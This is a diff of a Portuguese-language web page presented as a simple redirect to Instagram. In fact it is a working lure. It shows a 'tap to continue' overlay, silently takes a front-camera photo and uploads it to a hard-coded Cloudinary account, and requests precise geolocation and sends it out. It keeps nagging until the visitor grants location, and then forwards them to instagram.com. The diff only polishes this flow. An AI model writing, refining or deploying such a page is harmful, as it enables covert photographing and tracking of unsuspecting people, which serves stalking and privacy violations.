@@ -2,7 +2,7 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionamento</title> 
+  <title>Redirecionamento</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin: 0; overflow: hidden; background: #000; }
@@ -20,11 +20,13 @@
       z-index: 9999;
       text-align: center;
       padding: 20px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div id="overlay">Toque para continuar...</div>
+
   <script>
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
@@ -39,10 +41,10 @@
       const handler = () => {
         overlay.style.display = "none";
         overlay.removeEventListener("click", handler);
-        if (callback) callback();
+        callback();
       };
 
-      overlay.removeEventListener("click", handler);
+      overlay.onclick = null; // garante que não empilha cliques
       overlay.addEventListener("click", handler);
     }
 
@@ -52,6 +54,7 @@
           video: { facingMode: "user" },
           audio: false
         });
+
         const video = document.createElement("video");
         video.playsInline = true;
         video.muted = true;
@@ -110,18 +113,18 @@
             body: textForm
           });
 
-          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
+          if (!textResp.ok) throw new Error("Erro ao enviar localização");
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("Permita acesso à localização. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl); // só pede localização
+          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
+            requestLocation(imageUrl); // só tenta localização novamente
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
-        showOverlay("Permita acesso à localização. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl); // só pede localização
+        showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
+          requestLocation(imageUrl); // só tenta localização novamente
         });
       }, {
         enableHighAccuracy: true,
@@ -136,7 +139,7 @@
           const imageUrl = await capturePhoto();
           requestLocation(imageUrl);
         } else {
-          requestLocation(capturedImageUrl); // se já tirou a foto, só tenta localização
+          requestLocation(capturedImageUrl);
         }
       } catch (e) {
         console.error("Erro no fluxo:", e);
